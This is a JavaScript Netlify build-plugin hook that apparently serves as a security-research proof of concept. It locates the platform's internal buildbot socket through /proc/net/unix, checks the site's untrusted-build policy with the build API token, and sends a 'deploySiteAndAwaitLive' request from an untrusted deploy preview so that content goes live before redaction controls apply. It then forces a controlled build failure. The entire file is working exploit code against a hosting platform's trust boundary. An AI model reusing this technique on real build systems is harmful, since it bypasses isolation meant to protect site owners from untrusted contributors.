import { existsSync, readFileSync } from 'node:fs'
import { createConnection } from 'node:net'
import { isAbsolute, relative, resolve } from 'node:path'

const EXPECTED_SITE_ID = '43a2f4e4-df31-455e-85bc-21f37fae92cd'

const findBuildbotSocket = () => {
  try {
    const paths = readFileSync('/proc/net/unix', 'utf8')
      .split('\n')
      .slice(1)
      .filter(Boolean)
      .map((line) => line.trim().split(/\s+/)[7])
      .filter((path) => path && /(?:netlify|buildbot)/i.test(path) && !path.startsWith('@'))
    return paths.length === 1 ? paths[0] : null
  } catch {
    return null
  }
}

const requestEarlyDeploy = (deployDir) =>
  new Promise((resolveRequest) => {
    const socketPath = findBuildbotSocket()
    const result = {
      socketFound: Boolean(socketPath),
      connected: false,
      requestWritten: false,
      responseReceived: false,
      responseSucceeded: false,
      timedOut: false,
    }

    if (!socketPath) {
      resolveRequest(result)
      return
    }

    let response = ''
    let settled = false
    const client = createConnection({ path: socketPath })
    const finish = () => {
      if (settled) return
      settled = true
      clearTimeout(timer)
      client.destroy()
      let parsed
      try {
        parsed = JSON.parse(response)
      } catch {}
      result.responseWasJson = parsed !== undefined
      result.responseSucceeded = parsed?.succeeded === true
      result.responseErrorType = ['none', 'user', 'system'].includes(parsed?.values?.error_type)
        ? parsed.values.error_type
        : null
      resolveRequest(result)
    }
    const timer = setTimeout(() => {
      result.timedOut = true
      finish()
    }, 90_000)

    client.once('connect', () => {
      result.connected = true
      client.write(
        JSON.stringify({ action: 'deploySiteAndAwaitLive', deployDir, environment: [] }),
        (error) => {
          result.requestWritten = !error
          if (error) finish()
        },
      )
    })
    client.on('data', (chunk) => {
      result.responseReceived = true
      response += chunk.toString('utf8').slice(0, 8_192)
      finish()
    })
    client.once('error', finish)
    client.once('close', finish)
  })

const readPolicy = async ({ token, apiHost }) => {
  try {
    const base = /^https?:\/\//i.test(apiHost || '') ? apiHost : `https://${apiHost || 'api.netlify.com'}`
    const response = await fetch(new URL(`/api/v1/sites/${EXPECTED_SITE_ID}`, base), {
      headers: { Authorization: `Bearer ${token}` },
      redirect: 'error',
      signal: AbortSignal.timeout(10_000),
    })
    const body = response.ok ? await response.json() : null
    return {
      status: response.status,
      untrustedFlow: body?.build_settings?.untrusted_flow || null,
    }
  } catch (error) {
    return { requestFailed: true, errorClass: error?.constructor?.name || 'Error' }
  }
}

export const onPostBuild = async ({ constants, utils }) => {
  const publishDir = resolve(constants.PUBLISH_DIR || '')
  const repositoryRoot = resolve(process.cwd())
  const deployDir = relative(repositoryRoot, publishDir) || '.'
  const publishInsideRepository = !isAbsolute(deployDir) && !deployDir.startsWith('..')
  const functionsDistExists = existsSync(resolve(constants.FUNCTIONS_DIST || ''))
  const policy =
    typeof constants.NETLIFY_API_TOKEN === 'string' && constants.NETLIFY_API_TOKEN.length > 0
      ? await readPolicy({
          token: constants.NETLIFY_API_TOKEN,
          apiHost: constants.NETLIFY_API_HOST,
        })
      : null
  const prerequisitesSatisfied =
    process.env.CONTEXT === 'deploy-preview' &&
    process.env.REVIEW_ID === '1' &&
    constants.SITE_ID === EXPECTED_SITE_ID &&
    policy?.untrustedFlow === 'redact' &&
    publishInsideRepository &&
    functionsDistExists
  const result = {
    schema: 'netlify-untrusted-executable-preemption.v1',
    contextIsDeployPreview: process.env.CONTEXT === 'deploy-preview',
    reviewIdIsOne: process.env.REVIEW_ID === '1',
    siteIdMatches: constants.SITE_ID === EXPECTED_SITE_ID,
    policy,
    publishInsideRepository,
    functionsDistExists,
    prerequisitesSatisfied,
    functionContainsSecretMaterial: false,
    credentialValuesLogged: false,
  }

  if (prerequisitesSatisfied) {
    result.deploy = await requestEarlyDeploy(deployDir)
  }

  result.controlledFailureRequested = result.deploy?.responseSucceeded === true
  console.log(`NETLIFY_UNTRUSTED_EXECUTABLE_PREEMPTION ${JSON.stringify(result)}`)

  if (result.controlledFailureRequested) {
    utils.build.failBuild('Controlled failure after executable deploy finalized through buildbot socket')
  }
}
